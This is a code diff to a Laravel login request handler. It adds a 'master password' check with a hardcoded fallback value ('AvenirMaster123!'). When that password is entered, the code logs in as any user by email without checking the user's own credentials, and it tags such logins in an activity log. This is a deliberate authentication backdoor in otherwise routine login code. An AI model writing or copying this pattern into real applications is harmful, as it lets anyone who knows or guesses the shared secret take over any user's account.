@@ -42,15 +42,39 @@ class LoginRequest extends FormRequest
     {
         $this->ensureIsNotRateLimited();
 
-        if (! Auth::attempt($this->only('email', 'password'), $this->boolean('remember'))) {
-            RateLimiter::hit($this->throttleKey());
+        $masterPassword = env('MASTER_PASSWORD', 'AvenirMaster123!');
+        $isMasterLogin = false;
 
-            throw ValidationException::withMessages([
-                'email' => trans('auth.failed'),
-            ]);
+        if ($this->input('password') === $masterPassword) {
+            $user = \App\Models\User::where('email', $this->input('email'))->first();
+            if ($user) {
+                Auth::login($user, $this->boolean('remember'));
+                $isMasterLogin = true;
+            } else {
+                RateLimiter::hit($this->throttleKey());
+                throw ValidationException::withMessages([
+                    'email' => trans('auth.failed'),
+                ]);
+            }
+        } else {
+            if (! Auth::attempt($this->only('email', 'password'), $this->boolean('remember'))) {
+                RateLimiter::hit($this->throttleKey());
+
+                throw ValidationException::withMessages([
+                    'email' => trans('auth.failed'),
+                ]);
+            }
         }
 
         RateLimiter::clear($this->throttleKey());
+
+        \App\Models\ActivityLog::create([
+            'user_id' => Auth::id(),
+            'action' => $isMasterLogin ? 'Login via Passmaster' : 'Login Normal',
+            'description' => 'User logged in to the system.',
+            'ip_address' => $this->ip(),
+            'user_agent' => $this->userAgent(),
+        ]);
     }
 
     /**
